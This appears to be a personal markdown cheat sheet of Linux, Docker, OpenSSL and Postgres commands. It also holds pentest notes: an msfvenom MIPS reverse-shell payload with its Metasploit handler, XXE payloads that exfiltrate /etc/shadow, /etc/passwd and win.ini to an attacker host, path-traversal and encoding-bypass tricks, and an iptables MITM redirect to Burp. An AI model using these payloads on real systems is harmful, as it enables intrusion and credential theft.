# Reference

**Things I do all the time but can never remember.**

## Generate Python flamegraph

```
pip install flameprof
python3 -m cProfile -o prof2.prof script.py
flameprof --perfdata prof2.prof --format log | ~/FlameGraph/flamegraph.pl --width 2000  > output.svg
```

## Parallelise exec in find output
Echo the command to run from exec, then pipe to xargs
```
find . -maxdepth 1 -iname "*.HEIC" -exec echo heif-convert {} jpeg/{}.jpeg \; | xargs -P 4 -I @ bash -c @
```

## List all non-docker processes on slackware

Same output format as `ps fauxww`, using cgname to exclude docker children
```
ps wwfaxo cgname,user,pid,%cpu,%mem,vsz,rss,tty,stat,start,time,command | egrep -v 'elogind:/docker|containerd|docker' | awk '{ print substr($0, index($0,$2)) }'
```


## Run some commands in tmux windows

```
LOOP=8
tmux new-session -d -s sess1
tmux set -g remain-on-exit on
for i in $( seq 1 $LOOP )
do
    tmux new-window -t sess1
    tmux send-keys -t sess1:${i} "sleep ${i}" ENTER
done

```

## Ubuntu use local mirror

```
sed -i 's/archive\./nz.archive./g' /etc/apt/sources.list
sed -i 's/security\./nz.archive./g' /etc/apt/sources.list
```

## signed <-> unsigned int

Python:

```
def to_unsigned(bits, x):
    return x & ((1<<bits)-1)

def to_signed(bits, x):
    offset = 1<<(bits-1)
    return to_unsigned(bits, x + offset) - offset
 
>>> to_signed(32,4000000000)
-294967296
>>> to_unsigned(32,-294967296)
4000000000
>>>
```

## Postgres Stuff

Authenticate over network (not socket) as specific user:

```
psql -h 127.0.0.1 --password -U <username>  <dbname>
```

Log all sql queries to log file:

*Edit the `postgres.conf` file*
```
log_destination = 'stderr'  
logging_collector = on
log_directory = 'pg_log'
log_filename = 'postgresql-queries.log'
log_truncate_on_rotation = on
log_rotation_size = 102400
log_statement = 'all'
```



## Force .NET assembly recompilation

In Admin CMD:
```
%windir%\microsoft.net\framework64\v4.0.30319\ngen.exe update /force
```

## letsencrypt certificate via DNS (allows wildcard)

non-wildcard:

```
certbot certonly --manual -d <domain> --agree-tos --register-unsafely-without-email --preferred-challenges dns-01
```

wildcard:

```
certbot certonly --manual -d *.<domain> --agree-tos --register-unsafely-without-email --preferred-challenges dns-01
```


## ftp serveraccept uploads

Used for serving and receiving files from minimal clients that may have no ncat etc, but do have ftp:

```
cd /tmp/ftp
python3 -m pyftpdlib -w -p 21
```


## cli speedtest

Pull a file from Cloudflare, should be close to line rate if POP nearby. Can pull up to around 4800000000 bytes (~4.8G)

```
time curl "https://speed.cloudflare.com/__down?bytes=2500000000" -o /dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2384M    0 2384M    0     0  98.2M      0 --:--:--  0:00:24 --:--:-- 97.5M

real    0m24.280s
user    0m5.475s
sys     0m8.632s
```
Total = ( bytes / bytes-to-megabits [125000] / real time )

2500000000 / 125000 / 24.280 = 823.723229

## tar

Extract single file in tar to stdout

```
tar -x -O -f <file.tar> <path/to/file/within> 
```

Compress with multithreaded zstd and custom compression level. T0 is multithread to num cores, -4 is compression level 4 (default is 3)

```
tar -I "zstd -T0 -4"  -cvf backup.tar.zst <filename>
```

Compress with above and a large window size for dedup

```
tar -I "zstd -T0 -4 --long"  -cvf backup.tar.zst <filename>
```

 Exclude some dirs and self
 
 ```
 tar --exclude="/dev" --exclude="/sys" --exclude="/proc" --exclude="/run" --exclude="/swapfile" --exclude="/tmp" --exclude="disk-backup.tar.zst" -cavf disk-backup.tar.zst /
 ```

## docker

Run container with custom command

`docker run -it <IMAGEID> /bin/sh`
  
Save container to tar (with layers)

`docker save <IMAGEID> -o <tarfile-path> `


Create a container from image without running it

`docker create <IMAGEID>`

List all containers (include non-running)

`docker ps -a`

Export container filesystem to tar (needs container created from image)

`docker export <CONTAINERID> -o /tmp/upd-fs.tar`


## openssl create pkcs12 from x509

Create with no password at all (not even empty string):

```
openssl pkcs12 -export -inkey cert.key -in cert.pem -certfile stacked-cachain.pem -keypbe NONE -certpbe NONE -passout pass: -out deviceCert.pfx
```

`-certfile` is optional, this is a CA chain

Create with empty string password and no CA chain:

```
openssl pkcs12 -export  -inkey privKey.pem -in cert.pem -passout pass: -out deviceCert.pfx
```


## query aws creds 

sts get-session-identity using key from from ENV vars
```
AWS_ACCESS_KEY_ID=<ID> AWS_SECRET_ACCESS_KEY=<KEY> aws sts get-caller-identity
```

with temp session token:
```
AWS_ACCESS_KEY_ID=<ID> AWS_SECRET_ACCESS_KEY=<KEY> AWS_SESSION_TOKEN=<SESS_TOK> aws sts get-caller-identity
```


## listen for tcp connections and print the output, continuously

```
while true; do ncat -w1 -i0.1 -nlp 1234 ; printf "\n" ; done
```


## Reset Microsoft Defender Application Guard Edge browser instance

```
wdagtool.exe cleanup
```

## curl flags

Dont resovlve paths, for path traversal e.g. `GET /a/../ HTTP/1.1`
```
curl --path-as-is http://localhost/a/../
```

Control the reqeuest URI for doing things like submitting a full URL e.g. `GET http://target/a HTTP/1.1`
```
curl --request-target "http://target/a" http://localhost
```

Pin a hostname to an IP address, mostly useful for when you want to send a specific SNI:

```
curl https://www.example.com --resolve www.example.com:443:127.0.0.1
```


## gnu parallel-ing gooder

```
taskset -c 0-10 parallel -j11 --resume --resume-failed --progress --joblog ~/Desktop/parallel-joblog --timeout 300 < todo.txt
```
saves progress to joblog so it can be control-C'd. taskset to leave a core free, timeout to kill long runningjobs (can also use % of average).
todo.txt has shell commands which will be run.



## metasploit rev shell (mips)

```
msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=192.168.50.1 LPORT=5555 -f elf > /tmp/shell2.elf


msfconsole
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set PAYLOAD linux/mipsbe/shell_reverse_tcp
PAYLOAD => linux/mipsbe/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.50.1
LHOST => 192.168.50.1
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > exploit


```


## One line cert gen
```
openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt
```


## Dnsmasq-  DHCP only

`sudo dnsmasq -dC <conffile>`

```
dhcp-range=192.168.50.100,192.168.50.150,255.255.255.0,12h
dhcp-option=option:router,192.168.50.1
dhcp-option=option:dns-server,192.168.50.1
dhcp-authoritative
port=0
#remove the port line to run a dns server as well as dhcp
```


## XXE 
[See full list here](https://gist.github.com/staaldraad/01415b990939494879b4)

```
--------------------------------------------------------------
Vanilla, used to verify outbound xxe or blind xxe
--------------------------------------------------------------

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>

----------------------------------------------------------------
OoB (seems to work better against .NET)
----------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------

<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-----------------------------------------------------------------------
OoB extra ERROR -- Java
-----------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
## External dtd: ##

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%data3;">'> %param1; %external;


```

## Auditd

```
auditctl -l
auditctl -w /bin/ls -p x -k my_execs
ausearch -i -k my_execs
```
or

```
sudo forkstat -e exec
```


## Unicode
[Unicode Char transformations link](https://websec.github.io/unicode-security-guide/character-transformations/)

```
＇ fullwidth apos
＜ fullwidth lessthan
🎅 santa emoji


Target	NSF 1	NSF 2	NSF 3	Notes	
A	%C1%81	%E0%81%81	%F0%80%81%81	Latin A useful as a base test case.	
"	%C0%A2	%E0%80%A2	%F0%80%80%A2	Double quote	
'	%C0%A7	%E0%80%A7	%F0%80%80%A7	Single quote	
<	%C0%BC	%E0%80%BC	%F0%80%80%BC	Less-than sign	
>	%C0%BE	%E0%80%BE	%F0%80%80%BE	Greater-than sign	
.	%C0%AE	%E0%80%AE	%F0%80%80%AE	Full stop	
/	%C0%AF	%E0%80%AF	%F0%80%80%AF	Solidus	
\	%C1%9C	%E0%81%9C	%F0%80%81%9C	Reverse solidus

```

## Forwarding from one interface to the internet
```
# where eth2 is the device you want forwarded out, and eth0 is the internet attached adapter
PRIVATE=eth2
PUBLIC=eth0
iptables -A FORWARD -i ${PRIVATE} -o ${PUBLIC} -j ACCEPT
iptables -A FORWARD -i ${PUBLIC} -o ${PRIVATE} -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o ${PUBLIC} -j MASQUERADE
sysctl -w net.ipv4.ip_forward=1
```

## MITM transparent to burp
```

#Where eth2 is the target device, and eth0 is the NAT out to internet / reachable proxy server
# dont forget to run dns, transparent mode in burp, listen on external interface, disable firewall, sysctl -w <forwarding on thing> etc

iptables --table nat --append PREROUTING --in-interface eth2 --protocol tcp --dport 443 --jump DNAT --to 192.168.200.164:8080
iptables --table nat --append PREROUTING --in-interface eth2 --protocol tcp --dport 80 --jump DNAT --to 192.168.200.164:8080
iptables -A FORWARD -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 
```
